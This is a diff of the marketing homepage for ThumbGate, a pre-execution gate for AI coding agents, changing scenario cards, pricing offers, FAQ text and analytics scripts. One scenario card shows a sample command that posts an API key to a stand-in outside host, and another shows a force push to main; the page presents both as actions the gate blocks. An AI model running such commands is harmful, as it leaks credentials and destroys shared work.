-            <img src="/assets/diagrams/before-after.svg" width="960" height="300" alt="Without ThumbGate the same AI agent mistake repeats. With ThumbGate one thumbs-down becomes a local pre-action gate that can refresh or expire." loading="lazy" decoding="async">
-          </figure>
-          <figure class="diagram-frame">
-            <img src="/assets/diagrams/loop.svg" width="960" height="300" alt="Agent proposes a tool, ThumbGate decides ALLOW WARN or DENY, thumbs feedback becomes a rule that closes the loop." loading="lazy" decoding="async">
-          </figure>
+        <div class="section-kicker">See the firewall work</div>
+        <h2 class="section-title">Four failures. Four evidence paths.</h2>
+        <p class="section-lede">No generic safety score. Each decision names the action, boundary, verdict, and receipt.</p>
+        <div class="scenarios">
+          <article class="scenario" data-scenario="git">
+            <div class="scenario-head"><h3>Destructive Git</h3><span class="scenario-mode">strict mode</span></div>
+            <pre>$ git push --force origin main
+rule     protect-main
+timing   before execution</pre>
+            <div class="scenario-result"><span>Configured destructive-action gate</span><strong>DENY</strong></div>
+          </article>
+          <article class="scenario" data-scenario="secret">
+            <div class="scenario-head"><h3>Secret exfiltration</h3><span class="scenario-mode">default floor</span></div>
+            <pre>$ curl -d "$API_KEY" outside.example
+signal   credential egress
+timing   before execution</pre>
+            <div class="scenario-result"><span>Detected secret-leak class</span><strong>DENY</strong></div>
+          </article>
+          <article class="scenario" data-scenario="claim">
+            <div class="scenario-head"><h3>False factual claim</h3><span class="scenario-mode">configured verifier</span></div>
+            <pre>claim    row count is 1,284
+actual   1,283
+status   mismatch</pre>
+            <div class="scenario-result"><span>Database evidence disagrees</span><strong class="mismatch">BLOCK RESPONSE</strong></div>
+          </article>
+          <article class="scenario" data-scenario="spend">
+            <div class="scenario-head"><span role="heading" aria-level="3">Unapproved spend</span><span class="scenario-mode">hard floor</span></div>
+            <pre>vendor    Apollo
+amount    USD 99
+authority none this turn</pre>
+            <div class="scenario-result"><span>Vendor + amount required</span><strong>DENY</strong></div>
+          </article>
+        </div>
+        <div class="runtime-strip" aria-label="Verified agent and runtime adapters">
+          <span>Claude Code</span><span>Cursor</span><span>Codex</span><span>Gemini CLI</span><span>Amp</span><span>OpenCode</span><span>MCP</span>
         </div>
       </div>
     </section>
 
     <section id="how-it-works">
       <div class="shell">
-        <div class="section-kicker">Self-improving product loop</div>
-        <h2 class="section-title">Pre-action checks—and the systems that refine them.</h2>
-        <p class="section-lede">Corrections become local lessons; repeated negatives become gates; the next action is checked before execution. <strong style="color:var(--text)">Click a step</strong> for the under-the-hood demo.</p>
-        <figure class="diagram-frame" style="margin-top:28px">
-          <img src="/assets/diagrams/self-improving-thumbs-loop.svg" width="1100" height="420" alt="Self-improving ThumbGate loop: thumbs up or thumbs down become a local lesson, then a prevention rule, then ALLOW WARN or DENY on the next tool call. The loop closes under your control without retraining the model." loading="lazy" decoding="async">
-        </figure>
-        <div class="self-improve-callout">
-          <strong>Is it really self-improving?</strong>
-          Yes — the control layer, not the LLM. 👍/👎 → local lesson → ranked rule → next tool call gated. No model retrain.
-        </div>
+        <div class="section-kicker">One self-improving control loop</div>
+        <h2 class="section-title">The gate gets better. Your model stays untouched.</h2>
+        <p class="section-lede">Reviewed outcomes refine local rules. Repeated failures can promote; stale gates expire. <strong style="color:var(--text)">Open a step.</strong></p>
         <div class="loop" role="tablist" aria-label="Self-improving product loop — click a step for under-the-hood demo">
           <!-- Cards are divs (not <button>) so headings/chips stay valid HTML; browsers
                auto-close <button> around <h3>/<div>, which broke click targets. -->
@@ -775,28 +788,28 @@
             <span class="loop-number">1</span>
             <div class="thumb-icon" aria-hidden="true">👍👎</div>
             <h3>Capture feedback</h3>
-            <p>Record explicit 👍 or 👎 with the action and outcome context.</p>
+            <p>Save 👍 or 👎 with the action and outcome.</p>
             <span class="loop-hint">Under the hood ↓</span>
           </div>
           <div class="loop-step" role="tab" tabindex="0" id="loop-tab-2" data-loop-step="2" aria-selected="false" aria-controls="loop-panel" aria-expanded="false">
             <span class="loop-number">2</span>
             <div class="thumb-icon" aria-hidden="true">🧠</div>
             <h3>Remember locally</h3>
-            <p>Store a reviewable lesson that survives sessions without writing into model weights.</p>
+            <p>Keep a reviewable lesson outside model weights.</p>
             <span class="loop-hint">Under the hood ↓</span>
           </div>
           <div class="loop-step" role="tab" tabindex="0" id="loop-tab-3" data-loop-step="3" aria-selected="false" aria-controls="loop-panel" aria-expanded="false">
             <span class="loop-number">3</span>
             <div class="thumb-icon" aria-hidden="true">📈</div>
             <h3>Rank and refine</h3>
-            <p>Re-rank lessons for the action. Repeated negatives can promote to blocking gates; stale gates expire.</p>
+            <p>Re-rank lessons. Repeated negatives can promote; stale gates expire.</p>
             <span class="loop-hint">Under the hood ↓</span>
           </div>
           <div class="loop-step" role="tab" tabindex="0" id="loop-tab-4" data-loop-step="4" aria-selected="false" aria-controls="loop-panel" aria-expanded="false">
             <span class="loop-number">4</span>
             <div class="thumb-icon" aria-hidden="true">🛡️</div>
             <h3>Gate the next action</h3>
-            <p>The action is allowed, warned, or denied before the tool proceeds.</p>
+            <p>Allow, warn, or deny before the tool runs.</p>
             <div class="decisions" aria-label="Possible decisions">
               <span class="decision allow">ALLOW</span>
               <span class="decision warn">WARN</span>
@@ -809,7 +822,7 @@
           <div class="loop-panel-header">
             <div>
               <div class="loop-panel-kicker" id="loop-panel-kicker">Under the hood</div>
-              <h3 class="loop-panel-title" id="loop-panel-title">Capture feedback</h3>
+              <div class="loop-panel-title" id="loop-panel-title" role="heading" aria-level="3">Capture feedback</div>
             </div>
             <button type="button" class="loop-panel-close" id="loop-panel-close" aria-label="Close under-the-hood demo">Close</button>
           </div>
@@ -838,30 +851,37 @@
             </div>
           </div>
         </div>
-        <p class="loop-back"><strong>Each reviewed outcome closes the loop—under your control.</strong> Lessons are re-ranked per action, repeated failures can promote into gates, and stale auto-promoted gates expire. The firewall improves from explicit feedback without retraining the model or silently rewriting policy.</p>
+        <p class="loop-back"><strong>That is “self-improving”:</strong> feedback changes enforcement—not model weights or policy without review.</p>
       </div>
     </section>
 
-    <section id="deliverables">
+    <section id="difference">
       <div class="shell">
-        <div class="section-kicker">What the $499 enterprise gate buys</div>
-        <h2 class="section-title">A managed gate for one painful workflow.</h2>
-        <p class="section-lede">Enterprise entry for one workflow—not an org-wide platform license.</p>
-        <div class="deliverables">
-          <article class="deliverable">
-            <h3>Failure map</h3>
-            <p>The exact risky action, trigger, accountable owner, current safeguard, and missing proof.</p>
+        <div class="section-kicker">A different execution layer</div>
+        <h2 class="section-title">Not a prompt. Not a judge. Not a postmortem.</h2>
+        <p class="section-lede">ThumbGate acts at the missing moment: before execution.</p>
+        <div class="difference-grid">
+          <article class="difference-card">
+            <div class="difference-label">Instruction</div>
+            <h3>Prompt rule</h3>
+            <p>Asks the model to behave.</p>
           </article>
-          <article class="deliverable">
-            <h3>Configured gate</h3>
-            <p>One supported local rule wired to deny, warn, or require a human before execution.</p>
+          <article class="difference-card">
+            <div class="difference-label">Evaluation</div>
+            <h3>LLM-as-a-Judge</h3>
+            <p>Scores generated output.</p>
           </article>
-          <article class="deliverable">
-            <h3>Regression and rollout proof</h3>
-            <p>The working test, rollout check, rollback boundary, and evidence receipt for the installed gate.</p>
+          <article class="difference-card">
+            <div class="difference-label">Measurement</div>
+            <h3>Postmortem eval</h3>
+            <p>Measures failures after the run.</p>
+          </article>
+          <article class="difference-card featured">
+            <div class="difference-label">Enforcement</div>
+            <h3>ThumbGate</h3>
+            <p>Checks configured boundaries before execution.</p>
           </article>
         </div>
-        <div class="boundary"><strong>Boundary:</strong> the offer covers one supported local workflow. Multi-system implementation, legal or compliance certification, guaranteed savings, and hosted team features require separate scope. If the workflow cannot be reduced to one supported gate, the order is refunded instead of silently upsold.</div>
       </div>
     </section>
 
@@ -889,8 +909,8 @@ next      decision recorded before execution</pre>
             </div>
           </div>
           <div class="proof-copy">
-            <p>Detected secret exfiltration and gate-process bypass attempts are denied by default (process-kill/environment-override self-disable floors). Matching destructive actions warn by default and deny in strict mode.</p>
-            <p>Managed strict-mode example—not a claim that every free install blocks every risky command automatically.</p>
+            <p>Detected secret exfiltration and gate-process bypass attempts are denied by default. Supported unapproved financial mutations are denied. Matching destructive actions warn by default and deny in strict mode.</p>
+            <p>This example does not mean every free install blocks every risky command.</p>
             <a href="https://github.com/IgorGanapolsky/ThumbGate/blob/main/docs/VERIFICATION_EVIDENCE.md" target="_blank" rel="noopener">Read the test-backed verification evidence →</a>
             <p style="margin-top:12px;"><a href="/whitepaper">White paper</a> · <a href="/eval-scorecard">Scorecard</a> · <a href="/architecture">Architecture</a> · <a href="/case-studies">Cases</a></p>
           </div>
@@ -898,30 +918,73 @@ next      decision recorded before execution</pre>
       </div>
     </section>
 
+    <section id="offers">
+      <div class="shell">
+        <div class="offers-intro">
+          <div>
+            <div class="section-kicker">Choose the operating path</div>
+            <h2 class="section-title">Self-serve, or bring us the failure.</h2>
+          </div>
+          <p class="section-lede">Choose Pro for self-serve. Choose Diagnostic when a costly failure still needs mapping and enforcement.</p>
+        </div>
+        <div class="offer-stack">
+          <aside class="pro-card" id="pro" aria-label="ThumbGate Pro subscription">
+            <div class="price"><strong>$19</strong><span>/mo · or $149/yr</span></div>
+            <h3>Pro</h3>
+            <p><strong>For individual operators.</strong> Local proof, dashboard, recall, and exports.</p>
+            <a class="button-pro" href="/checkout/pro?utm_source=website&amp;utm_medium=homepage_offer&amp;utm_campaign=product_replay&amp;cta_id=homepage_pro_buy&amp;cta_placement=offers&amp;plan_id=pro" data-offer-link data-plan-id="pro" data-cta-id="homepage_pro_buy" data-revenue-cta data-cta-placement="offers">Start Pro — $19/mo</a>
+            <p class="checkout-note">Hosted checkout · cancel anytime · free local evaluate stays free</p>
+            <ul class="offer-points">
+              <li>Local enforcement proof and dashboard</li>
+              <li>Recall and proof-ready exports</li>
+              <li>Preference-pair export</li>
+            </ul>
+          </aside>
+          <form id="buy" class="checkout-card" action="/go/diagnostic-pay" method="POST" data-primary-checkout>
+            <span id="workflow-sprint-intake" data-legacy-intake-alias aria-hidden="true"></span>
+            <span id="enterprise-gate"></span>
+            <input type="hidden" name="utm_source" value="website">
+            <input type="hidden" name="utm_medium" value="homepage_checkout">
+            <input type="hidden" name="utm_campaign" value="product_replay">
+            <input type="hidden" name="utm_content" value="offers_direct_checkout">
+            <input type="hidden" name="cta_id" value="homepage_diagnostic_buy">
+            <input type="hidden" name="cta_placement" value="offers">
+            <input type="hidden" name="plan_id" value="sprint_diagnostic">
+            <input type="hidden" name="landing_path" value="/">
+            <div class="price"><strong>$__SPRINT_DIAGNOSTIC_PRICE_DOLLARS__</strong><span>one time</span></div>
+            <h3>Diagnostic Gate</h3>
+            <p><strong>Managed AI Agent Workflow Gate.</strong> One painful workflow becomes one configured local gate and its regression test.</p>
+            <label for="buyer-email">Work email for the receipt</label>
+            <input id="buyer-email" type="email" name="customer_email" autocomplete="email" required placeholder="you@company.com">
+            <button class="button-primary" type="submit" data-revenue-cta data-cta-id="homepage_diagnostic_buy" data-cta-placement="offers">Get Started — $499 Diagnostic</button>
+            <p class="checkout-note">Secure Stripe · no subscription · one supported local workflow</p>
+            <ul class="offer-points">
+              <li>60-minute working review for one workflow</li>
+              <li>One configured local gate and its regression test</li>
+              <li>Rollout and rollback proof within two business days</li>
+            </ul>
+          </form>
+        </div>
+        <div class="boundary"><strong>Boundary:</strong> one supported local workflow. Multi-system implementation, certification, savings guarantees, and hosted team features require separate scope. If the workflow cannot be reduced to one supported gate, the order is refunded instead of silently upsold.</div>
+      </div>
+    </section>
+
     <section id="faq">
       <div class="shell">
         <div class="section-kicker">Before you buy</div>
-        <h2 class="section-title">Five questions, answered plainly.</h2>
+        <h2 class="section-title">Three questions, answered plainly.</h2>
         <div class="faq-list">
           <div class="faq-item open">
-            <button class="faq-q" type="button" aria-expanded="true">What do I get for $499?</button>
-            <div class="faq-a">One 60-minute working review for one repeated AI-agent workflow failure, one configured local gate for a supported workflow, its regression test, and a written rollout and rollback proof within two business days after access and the agreed materials are available.</div>
+            <button class="faq-q" type="button" aria-expanded="true">What does self-improving mean?</button>
+            <div class="faq-a">ThumbGate improves the control layer, not model weights. Reviewed feedback becomes local lessons; repeated concrete failures can promote into reviewable gates; stale auto-promoted gates expire.</div>
           </div>
           <div class="faq-item">
             <button class="faq-q" type="button" aria-expanded="false">Does ThumbGate block every risky command by default?</button>
-            <div class="faq-a">No. Detected secret exfiltration and gate-process bypass attempts are denied by default. Matching destructive actions warn unless strict enforcement is enabled. The managed gate defines the right boundary for your workflow instead of pretending every warning is a firewall.</div>
+            <div class="faq-a">No. Detected secret exfiltration, guardrail tampering, and supported unapproved financial mutations are denied by default. Other matching actions warn unless strict enforcement is enabled.</div>
           </div>
           <div class="faq-item">
-            <button class="faq-q" type="button" aria-expanded="false">Is this the enterprise option?</button>
-            <div class="faq-a">Yes. The $499 Enterprise Workflow Gate is the enterprise entry offer for one supported workflow. It is not an org-wide hosted platform license: shared hosting, SSO, compliance packaging, and multi-workflow rollout require separate scope and are not generally available.</div>
-          </div>
-          <div class="faq-item">
-            <button class="faq-q" type="button" aria-expanded="false">Does self-improving mean ThumbGate retrains my model?</button>
-            <div class="faq-a">No. ThumbGate does not change model weights and does not silently rewrite production policy. Self-improving under your control means explicit approvals and feedback teach the local control layer what to allow, block, or escalate next time: lessons are stored and re-ranked, repeated negative patterns can promote into gates, and stale auto-promoted gates expire.</div>
-          </div>
-          <div class="faq-item">
-            <button class="faq-q" type="button" aria-expanded="false">Is the self-improving logic a black box I have to trust blindly?</button>
-            <div class="faq-a">No. The promotion, demotion, and lesson-ranking logic ships in the public npm bundle under an MIT license — run <code>npm pack thumbgate</code> and read it yourself. Your lessons live in a local SQLite file you own, not a server you can't query. Paid tiers add hosted sync, the dashboard, and adapter coverage, not access to intelligence withheld from the free install.</div>
+            <button class="faq-q" type="button" aria-expanded="false">What do I get for $499?</button>
+            <div class="faq-a">One working review, one configured local gate for a supported workflow, its regression test, and rollout and rollback proof within two business days after access and agreed materials are available.</div>
           </div>
         </div>
       </div>
@@ -929,12 +992,12 @@ next      decision recorded before execution</pre>
 
     <section class="final">
       <div class="shell">
-        <div class="section-kicker">Two cash paths</div>
-        <h2 class="section-title">Start self-serve, or bring the failure that already cost you time.</h2>
-        <p class="section-lede">Pro is self-serve for operators. The $499 gate is a managed install for one painful workflow—not a policy deck.</p>
+        <div class="section-kicker">Stop teaching the same lesson twice</div>
+        <h2 class="section-title">Give the next agent a gate, not another warning.</h2>
+        <p class="section-lede">Start self-serve, or bring the repeated failure and leave with one test-backed boundary.</p>
         <div style="display:flex;flex-wrap:wrap;gap:12px;justify-content:center;margin-top:22px">
-          <a class="nav-buy" href="/checkout/pro?utm_source=website&amp;utm_medium=homepage_final&amp;utm_campaign=pro_self_serve&amp;cta_id=final_pro_buy&amp;cta_placement=final&amp;plan_id=pro" data-offer-link data-cta-id="final_pro_buy">Start Pro — $19/mo</a>
-          <a class="nav-enterprise" href="#enterprise-gate" data-offer-link data-cta-id="final_diagnostic_buy">Buy the $499 enterprise gate</a>
+          <a class="nav-buy" href="/checkout/pro?utm_source=website&amp;utm_medium=homepage_final&amp;utm_campaign=product_replay&amp;cta_id=final_pro_buy&amp;cta_placement=final&amp;plan_id=pro" data-offer-link data-plan-id="pro" data-cta-id="final_pro_buy">Start Pro — $19/mo</a>
+          <a class="nav-enterprise" href="#enterprise-gate" data-offer-link data-plan-id="sprint_diagnostic" data-cta-id="final_diagnostic_buy">Buy the $499 enterprise gate</a>
         </div>
       </div>
     </section>
@@ -996,35 +1059,52 @@ next      decision recorded before execution</pre>
       window.gtag('event', eventName, params || {});
     }
 
-    function captureOfferInterest(ctaId, placement) {
+    function captureOfferInterest(ctaId, placement, planId) {
+      const selectedPlan = planId === 'pro' ? 'pro' : 'sprint_diagnostic';
       const props = {
         ctaId: ctaId || 'homepage_diagnostic_buy',
         ctaPlacement: placement || 'homepage',
-        planId: 'sprint_diagnostic',
-        value: 499,
+        planId: selectedPlan,
+        value: selectedPlan === 'pro' ? 19 : 499,
         currency: 'USD',
       };
-      window.plausible('diagnostic_offer_click', { props: props });
+      window.plausible(selectedPlan === 'pro' ? 'pro_offer_click' : 'diagnostic_offer_click', { props: props });
       sendFirstPartyTelemetry('cta_click', props);
       try {
         if (window.posthog && typeof window.posthog.capture === 'function') {
-          window.posthog.capture('diagnostic_offer_click', props);
+          window.posthog.capture(selectedPlan === 'pro' ? 'pro_offer_click' : 'diagnostic_offer_click', props);
         }
       } catch (_) {}
     }
 
     document.querySelectorAll('[data-offer-link]').forEach(function (link) {
       link.addEventListener('click', function () {
-        captureOfferInterest(link.dataset.ctaId, 'page_anchor');
+        captureOfferInterest(link.dataset.ctaId, link.dataset.ctaPlacement || 'page_anchor', link.dataset.planId);
       });
     });
+
+    const heroInstallButton = document.getElementById('hero-install-copy');
+    if (heroInstallButton) {
+      heroInstallButton.addEventListener('click', function () {
+        const command = heroInstallButton.dataset.copyText || 'npx thumbgate init';
+        if (navigator.clipboard && typeof navigator.clipboard.writeText === 'function') {
+          navigator.clipboard.writeText(command).catch(function () {});
+        }
+        heroInstallButton.textContent = 'Copied: ' + command;
+        window.plausible('install_copy', { props: { placement: 'hero', command: command } });
+        sendFirstPartyTelemetry('install_copy', { placement: 'hero', command: command });
+        window.setTimeout(function () {
+          heroInstallButton.textContent = '$ ' + command;
+        }, 1800);
+      });
+    }
 
     const checkoutForm = document.querySelector('[data-primary-checkout]');
     if (checkoutForm) {
       checkoutForm.addEventListener('submit', function () {
         const props = {
           ctaId: 'homepage_diagnostic_buy',
-          ctaPlacement: 'hero',
+          ctaPlacement: 'offers',
           planId: 'sprint_diagnostic',
           value: 499,
           currency: 'USD',
